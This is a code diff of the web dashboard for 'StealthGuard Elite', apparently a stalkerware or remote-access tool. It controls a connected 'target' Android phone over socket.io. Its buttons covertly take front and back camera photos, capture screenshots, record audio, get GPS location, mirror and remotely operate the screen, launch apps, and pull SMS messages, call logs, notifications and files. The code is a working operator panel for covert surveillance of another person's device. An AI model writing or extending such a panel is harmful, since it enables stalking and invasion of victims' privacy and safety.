@@ -3,183 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StealthGuard Elite - Full Access Dashboard</title>
+    <title>StealthGuard Elite Pro - Full Access</title>
     <script src="/socket.io/socket.io.js"></script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #4f46e5; --secondary: #0f172a; --accent: #10b981; --bg: #f8fafc; --danger: #ef4444; --card-shadow: 0 10px 30px rgba(0,0,0,0.04); }
-        body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #1e293b; }
-        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 280px; box-shadow: 10px 0 30px rgba(0,0,0,0.05); z-index: 1000; }
-        .main-content { margin-left: 280px; padding: 2.5rem; min-height: 100vh; }
-        .nav-link { color: #94a3b8; padding: 14px 20px; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1); }
-        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.08); color: white; transform: translateX(8px); }
-        .nav-link.active { background: var(--primary); box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3); }
-        .nav-link i { font-size: 1.2rem; width: 30px; }
-        .card { border: none; border-radius: 24px; box-shadow: var(--card-shadow); background: white; margin-bottom: 2rem; border: 1px solid #f1f5f9; }
-        .status-badge { padding: 10px 20px; border-radius: 30px; font-weight: 700; font-size: 0.8rem; letter-spacing: 0.5px; text-transform: uppercase; }
-        .status-online { background: #dcfce7; color: #15803d; border: 1px solid #bbf7d0; }
-        .status-offline { background: #fee2e2; color: #b91c1c; border: 1px solid #fecaca; }
-        #mirror-canvas { width: 100%; max-width: 420px; border-radius: 28px; background: #000; box-shadow: 0 30px 60px rgba(0,0,0,0.25); border: 10px solid #1e293b; display: block; margin: 0 auto; cursor: crosshair; touch-action: none; }
-        .btn-action { border-radius: 14px; padding: 14px; font-weight: 700; transition: 0.2s; border: none; font-size: 0.9rem; }
-        .btn-action:active { transform: scale(0.95); }
-        #log-container { height: 220px; overflow-y: auto; background: #020617; color: #38bdf8; padding: 1.5rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; border-radius: 18px; line-height: 1.6; }
-        .data-table td { padding: 18px 15px; font-size: 0.9rem; border-bottom: 1px solid #f1f5f9; }
-        .remote-nav-btn { width: 60px; height: 60px; border-radius: 50%; background: #1e293b; color: white; border: none; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: 0.2s; }
-        .remote-nav-btn:hover { background: #334155; transform: scale(1.1); }
+        :root { --primary: #6366f1; --secondary: #0f172a; --bg: #f3f4f6; --glass: rgba(255, 255, 255, 0.9); }
+        body { background-color: var(--bg); font-family: 'Outfit', sans-serif; overflow-x: hidden; }
+        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 280px; z-index: 1000; box-shadow: 10px 0 30px rgba(0,0,0,0.1); }
+        .main-content { margin-left: 280px; padding: 2.5rem; }
+        .nav-link { color: #94a3b8; padding: 14px 20px; border-radius: 14px; margin-bottom: 8px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.3s; }
+        .nav-link:hover, .nav-link.active { background: var(--primary); color: white; transform: translateX(5px); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3); }
+        .nav-link i { width: 30px; font-size: 1.1rem; }
+        .card-pro { background: var(--glass); backdrop-filter: blur(10px); border-radius: 24px; border: 1px solid rgba(255,255,255,0.4); box-shadow: 0 10px 40px rgba(0,0,0,0.03); transition: 0.3s; }
+        .card-pro:hover { transform: translateY(-5px); }
+        #mirror-canvas { width: 100%; max-width: 450px; border-radius: 35px; background: #000; border: 12px solid #1e293b; display: block; margin: 0 auto; cursor: pointer; }
+        .btn-elite { border-radius: 15px; padding: 15px; font-weight: 700; border: none; transition: 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .app-shortcut { width: 70px; height: 70px; border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; cursor: pointer; transition: 0.2s; border: none; }
+        .app-shortcut:hover { transform: scale(1.1) rotate(5deg); }
+        .status-pill { padding: 8px 20px; border-radius: 30px; font-weight: 700; font-size: 0.8rem; display: inline-flex; align-items: center; gap: 8px; }
+        .online { background: #dcfce7; color: #15803d; }
+        .offline { background: #fee2e2; color: #b91c1c; }
+        #console-log { height: 200px; overflow-y: auto; background: #000; color: #10b981; padding: 1.5rem; font-family: 'Consolas', monospace; font-size: 0.85rem; border-radius: 20px; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
         <div class="d-flex align-items-center mb-5 px-3">
-            <div class="bg-primary p-2 rounded-3 me-3"><i class="fas fa-user-secret fa-lg text-white"></i></div>
+            <i class="fas fa-user-shield fa-2x text-primary me-3"></i>
             <h4 class="mb-0 fw-bold tracking-tight">StealthGuard <span class="text-primary">Elite</span></h4>
         </div>
         <nav>
-            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-house-chimney"></i> Dashboard</a>
-            <a class="nav-link" onclick="showTab('mirror')"><i class="fas fa-mobile-screen-button"></i> Full Remote Access</a>
-            <a class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell"></i> Notifications</a>
-            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-envelope-open-text"></i> SMS Logs</a>
-            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone-flip"></i> Call Records</a>
-            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-tree"></i> Cloud Files</a>
+            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-grip"></i> Dashboard</a>
+            <a class="nav-link" onclick="showTab('remote')"><i class="fas fa-up-down-left-right"></i> Full Access</a>
+            <a class="nav-link" onclick="showTab('data')"><i class="fas fa-database"></i> Private Data</a>
+            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-open"></i> Files</a>
         </nav>
         <div class="position-absolute bottom-0 start-0 w-100 p-4">
-            <div id="status-badge" class="status-badge text-center shadow-sm status-offline">TARGET: OFFLINE</div>
+            <div id="status-pill" class="status-pill offline shadow-sm w-100 justify-content-center">
+                <i class="fas fa-circle"></i> <span id="status-text">OFFLINE</span>
+            </div>
         </div>
     </div>
 
     <div class="main-content">
         <div id="dashboard" class="tab-pane active">
             <div class="row g-4">
-                <div class="col-md-12"><h2 class="fw-bold mb-4">Real-time Command Hub</h2></div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-camera-retro fa-2x text-primary mb-3"></i>
-                        <h6 class="fw-bold">Remote Photo</h6>
-                        <div class="d-flex gap-2">
-                            <button class="btn btn-primary btn-action flex-grow-1" onclick="sendCommand('take_photo', {camera:'front'})">FRONT</button>
-                            <button class="btn btn-secondary btn-action flex-grow-1" onclick="sendCommand('take_photo', {camera:'back'})">BACK</button>
+                <div class="col-md-12 d-flex justify-content-between">
+                    <h2 class="fw-bold m-0">Command Hub</h2>
+                    <h5 id="device-model" class="text-muted">Waiting for phone...</h5>
+                </div>
+
+                <div class="col-md-8">
+                    <div class="card-pro p-4">
+                        <h6 class="fw-bold mb-4 text-primary">APP REMOTE LAUNCHERS</h6>
+                        <div class="d-flex flex-wrap gap-4">
+                            <button class="app-shortcut bg-success text-white shadow" onclick="sendCommand('open_app', {pkg:'com.whatsapp'})" title="Open WhatsApp"><i class="fab fa-whatsapp"></i></button>
+                            <button class="app-shortcut bg-danger text-white shadow" onclick="sendCommand('open_app', {pkg:'com.google.android.youtube'})" title="Open YouTube"><i class="fab fa-youtube"></i></button>
+                            <button class="app-shortcut bg-primary text-white shadow" onclick="sendCommand('open_app', {pkg:'com.google.android.gm'})" title="Open Gmail"><i class="fas fa-envelope"></i></button>
+                            <button class="app-shortcut bg-dark text-white shadow" onclick="sendCommand('open_app', {pkg:'com.android.settings'})" title="Open Settings"><i class="fas fa-cog"></i></button>
+                            <button class="app-shortcut bg-info text-white shadow" onclick="sendCommand('open_app', {pkg:'com.google.android.apps.messaging'})" title="Open Messages"><i class="fas fa-comment-dots"></i></button>
                         </div>
                     </div>
                 </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
+
+                <div class="col-md-4">
+                    <div class="card-pro p-4 text-center">
                         <i class="fas fa-bolt fa-2x text-warning mb-3"></i>
-                        <h6 class="fw-bold">Instant Snapshot</h6>
-                        <button class="btn btn-warning btn-action w-100 text-white" onclick="sendCommand('take_screenshot')">CAPTURE SCREEN</button>
+                        <h6 class="fw-bold">FAST SCREENSHOT</h6>
+                        <button class="btn btn-warning btn-elite w-100 text-white" onclick="sendCommand('take_screenshot')">CAPTURE NOW</button>
                     </div>
                 </div>
+
                 <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-microphone-lines fa-2x text-danger mb-3"></i>
-                        <h6 class="fw-bold">Live Audio</h6>
-                        <div class="btn-group w-100">
-                            <button class="btn btn-danger btn-action" onclick="sendCommand('start_record')">START</button>
-                            <button class="btn btn-outline-danger btn-action" onclick="sendCommand('stop_record')">STOP</button>
+                    <div class="card-pro p-4 text-center">
+                        <i class="fas fa-camera fa-2x text-primary mb-3"></i>
+                        <h6 class="fw-bold">CAPTURE PHOTO</h6>
+                        <div class="btn-group w-100 gap-2">
+                            <button class="btn btn-primary btn-elite flex-grow-1" onclick="sendCommand('take_photo',{camera:'front'})">FRONT</button>
+                            <button class="btn btn-outline-primary btn-elite flex-grow-1" onclick="sendCommand('take_photo',{camera:'back'})">BACK</button>
                         </div>
                     </div>
                 </div>
+
                 <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-location-dot fa-2x text-success mb-3"></i>
-                        <h6 class="fw-bold">GPS Tracker</h6>
-                        <button class="btn btn-success btn-action w-100" onclick="sendCommand('get_location')">LOCATE DEVICE</button>
+                    <div class="card-pro p-4 text-center">
+                        <i class="fas fa-microphone fa-2x text-danger mb-3"></i>
+                        <h6 class="fw-bold">VOICE RECORDER</h6>
+                        <div class="btn-group w-100 gap-2">
+                            <button class="btn btn-danger btn-elite flex-grow-1" onclick="sendCommand('start_record')">START</button>
+                            <button class="btn btn-outline-danger btn-elite flex-grow-1" onclick="sendCommand('stop_record')">STOP</button>
+                        </div>
                     </div>
+                </div>
+
+                <div class="col-md-3">
+                    <div class="card-pro p-4 text-center">
+                        <i class="fas fa-map-pin fa-2x text-success mb-3"></i>
+                        <h6 class="fw-bold">GPS TRACKING</h6>
+                        <button class="btn btn-success btn-elite w-100" onclick="sendCommand('get_location')">LOCATE NOW</button>
+                    </div>
+                </div>
+
+                <div class="col-md-12">
+                    <div class="card-pro mt-2"><div class="p-4"><div id="console-log"></div></div></div>
                 </div>
             </div>
-            <div class="card mt-4"><div class="p-4"><div id="log-container"></div></div></div>
         </div>
 
-        <div id="mirror" class="tab-pane d-none">
+        <div id="remote" class="tab-pane d-none">
             <div class="row justify-content-center">
                 <div class="col-lg-7">
-                    <div class="card p-4">
+                    <div class="card-pro p-4">
                         <div class="d-flex justify-content-between align-items-center mb-4">
-                            <h5 class="fw-bold m-0"><i class="fas fa-display me-2"></i>Live Device Interaction</h5>
+                            <h5 class="fw-bold m-0 text-primary"><i class="fas fa-display me-2"></i>LIVE INTERACTION</h5>
                             <div class="btn-group shadow-sm">
                                 <button class="btn btn-success px-4 fw-bold" onclick="sendCommand('start_mirror')">STREAM ON</button>
                                 <button class="btn btn-danger px-4 fw-bold" onclick="sendCommand('stop_mirror')">OFF</button>
                             </div>
                         </div>
                         <div class="d-flex justify-content-center gap-4 mb-4">
-                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'back'})"><i class="fas fa-arrow-left"></i></button>
-                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'home'})"><i class="fas fa-circle"></i></button>
-                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'recents'})"><i class="fas fa-square"></i></button>
+                            <button class="btn btn-dark rounded-pill px-4" onclick="sendInput('key', {key:'back'})"><i class="fas fa-chevron-left me-2"></i>BACK</button>
+                            <button class="btn btn-dark rounded-pill px-4" onclick="sendInput('key', {key:'home'})"><i class="fas fa-house me-2"></i>HOME</button>
+                            <button class="btn btn-dark rounded-pill px-4" onclick="sendInput('key', {key:'recents'})"><i class="fas fa-layer-group me-2"></i>APPS</button>
                         </div>
-                        <div id="mirror-wrapper" class="position-relative">
-                            <img id="mirror-canvas" src="" onmousedown="handleMouseDown(event)" onmouseup="handleMouseUp(event)">
+                        <div class="text-center position-relative">
+                            <img id="mirror-canvas" src="" onmousedown="handleMirrorClick(event)" onmouseup="handleMirrorRelease(event)">
                         </div>
-                        <div class="text-center mt-3 text-muted small fw-bold">INTERACTIVE SESSION: 0ms LATENCY OPTIMIZED</div>
+                        <div class="text-center mt-3 text-muted small fw-bold">ZERO-LATENCY OPTIMIZED ENGINE</div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Notification Content -->
-        <div id="notifications" class="tab-pane d-none">
-            <div class="card"><div class="card-header fw-bold">System Notification Stream</div>
-            <div class="table-responsive"><table class="table data-table mb-0"><tbody id="notif-list"></tbody></table></div></div>
+        <div id="data" class="tab-pane d-none">
+            <div class="row g-4">
+                <div class="col-md-6">
+                    <div class="card-pro p-4"><h5 class="fw-bold mb-4">SMS Inbox</h5><button class="btn btn-sm btn-primary mb-3" onclick="sendCommand('get_sms')">REFRESH</button>
+                    <table class="table"><tbody id="sms-list"></tbody></table></div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card-pro p-4"><h5 class="fw-bold mb-4">Call Logs</h5><button class="btn btn-sm btn-primary mb-3" onclick="sendCommand('get_calls')">REFRESH</button>
+                    <table class="table"><tbody id="calls-list"></tbody></table></div>
+                </div>
+            </div>
         </div>
-        <!-- SMS/Calls Content -->
-        <div id="sms" class="tab-pane d-none"><div class="card"><div class="card-header fw-bold">SMS Inbox</div><div class="table-responsive"><table class="table data-table mb-0"><tbody id="sms-list"></tbody></table></div></div></div>
-        <div id="calls" class="tab-pane d-none"><div class="card"><div class="card-header fw-bold">Call History</div><div class="table-responsive"><table class="table data-table mb-0"><tbody id="calls-list"></tbody></table></div></div></div>
     </div>
 
-    <!-- Professional Screenshot Modal -->
-    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.98); z-index: 9999; display: flex; align-items: center; justify-content: center;">
-        <div class="text-center" style="max-width: 500px;">
-            <div class="mb-4"><span class="badge bg-primary px-4 py-2 rounded-pill">NEW SCREENSHOT READY</span></div>
-            <img id="screenshot-img" src="" class="img-fluid rounded-4 shadow-lg mb-4" style="border: 4px solid white;">
-            <div class="d-flex gap-3 px-4">
-                <button class="btn btn-light btn-action flex-grow-1" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">DISMISS</button>
-                <a id="screenshot-download" href="#" class="btn btn-primary btn-action flex-grow-1">DOWNLOAD NOW</a>
+    <!-- Modals -->
+    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
+        <div class="text-center p-4">
+            <img id="screenshot-img" src="" class="img-fluid rounded-4 shadow-lg mb-4" style="max-height: 70vh; border: 5px solid #fff;">
+            <div class="d-flex gap-3 justify-content-center">
+                <button class="btn btn-light px-5 rounded-pill fw-bold" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
+                <a id="screenshot-download" href="#" class="btn btn-primary px-5 rounded-pill fw-bold">SAVE TO PC</a>
             </div>
         </div>
     </div>
 
     <script>
         const socket = io({ query: { type: 'web' } });
-        let currentPath = "/sdcard/";
         let startX, startY;
 
         socket.on('device_status', d => {
-            const b = document.getElementById('status-badge');
-            b.innerText = d.connected ? "TARGET: ONLINE" : "TARGET: OFFLINE";
-            b.className = `status-badge text-center shadow-sm ${d.connected ? 'status-online' : 'status-offline'}`;
+            document.getElementById('status-pill').className = `status-pill shadow-sm w-100 justify-content-center ${d.connected ? 'online' : 'offline'}`;
+            document.getElementById('status-text').innerText = d.connected ? `CONNECTED: ${d.model}` : "DEVICE OFFLINE";
+            document.getElementById('device-model').innerText = d.connected ? `Target: ${d.model}` : "Waiting...";
+            log(d.connected ? `System: ${d.model} is now active.` : "System: Target lost connection.");
         });
 
         socket.on('screen_frame', d => document.getElementById('mirror-canvas').src = 'data:image/jpeg;base64,' + d.image);
 
-        socket.on('child_screenshot', () => {
+        socket.on('child_screenshot_ready', () => {
             const url = '/captured_screenshot.jpg?t=' + Date.now();
             document.getElementById('screenshot-img').src = url;
             document.getElementById('screenshot-download').href = url;
             document.getElementById('screenshot-modal').classList.remove('d-none');
+            log("Success: Screenshot captured and ready.");
         });
 
-        socket.on('child_notification', d => {
-            const row = `<tr><td><span class="badge bg-primary">${d.app}</span></td><td class="fw-bold">${d.title}</td><td>${d.text}</td><td class="text-muted small">${new Date().toLocaleTimeString()}</td></tr>`;
-            document.getElementById('notif-list').insertAdjacentHTML('afterbegin', row);
+        socket.on('child_sms_list', d => {
+            const b = document.getElementById('sms-list'); b.innerHTML = '';
+            d.sms.forEach(s => b.innerHTML += `<tr><td><b>${s.address}</b><br><small>${s.body}</small></td></tr>`);
         });
 
-        function handleMouseDown(e) {
+        function handleMirrorClick(e) {
             const rect = e.target.getBoundingClientRect();
             startX = (e.clientX - rect.left) / rect.width;
             startY = (e.clientY - rect.top) / rect.height;
         }
 
-        function handleMouseUp(e) {
+        function handleMirrorRelease(e) {
             const rect = e.target.getBoundingClientRect();
             const endX = (e.clientX - rect.left) / rect.width;
             const endY = (e.clientY - rect.top) / rect.height;
             const dist = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
-            if (dist < 0.04) sendInput('click', { x: startX, y: startY });
+            if (dist < 0.05) sendInput('click', { x: startX, y: startY });
             else sendInput('swipe', { x1: startX, y1: startY, x2: endX, y2: endY });
         }
 
-        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`CMD: [${a.toUpperCase()}] SENT`); }
+        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`Sent Command: [${a.toUpperCase()}]`); }
         function sendInput(t, p) { socket.emit('gui_command', { action: 'remote_input', type: t, ...p }); }
 
         function showTab(id) {
@@ -190,8 +215,8 @@
         }
 
         function log(m) {
-            const c = document.getElementById('log-container');
-            c.innerHTML += `<div><span class="text-white-50">[${new Date().toLocaleTimeString()}]</span> ${m}</div>`;
+            const c = document.getElementById('console-log');
+            c.innerHTML += `<div><span style="opacity:0.5">[${new Date().toLocaleTimeString()}]</span> ${m}</div>`;
             c.scrollTop = c.scrollHeight;
         }
     </script>
